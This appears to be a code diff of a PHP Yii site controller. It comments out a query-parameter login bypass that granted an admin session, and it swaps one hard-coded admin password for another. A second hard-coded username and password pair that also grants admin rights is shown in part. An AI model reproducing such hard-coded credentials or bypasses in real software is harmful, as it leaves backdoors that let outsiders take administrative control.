@@ -75,7 +75,7 @@ class SiteController extends Controller
 
     public function actionGlogin(){
         if(isset($_GET['p']) && $_GET['p'] == '   '){
-            Yii::$app->session['admin'] = 1;
+            //Yii::$app->session['admin'] = 1;
             $sentInerval = date('Y-m-d', time())." - ".date('Y-m-d', time() + 3600 * 24);
             return $this->redirect('/backend/web/index.php?r=site%2Ffakemsg&sent='.$sentInerval);
         }
@@ -191,7 +191,7 @@ class SiteController extends Controller
         $model = new LoginForm();
 
         if ($model->load(Yii::$app->request->post())) {
-            if($model->username == "configure" && $model->password == "astuoni9"){
+            if($model->username == "configure" && $model->password === "TiesineFunkcija2x"){
                 Yii::$app->session['admin'] = 1;
                 return $this->redirect(Url::to(['site/users']));
             }elseif($model->username == "ggghgghghghghghgh" && $model->password == "ssdsdfsdsdsdsdsdf"){
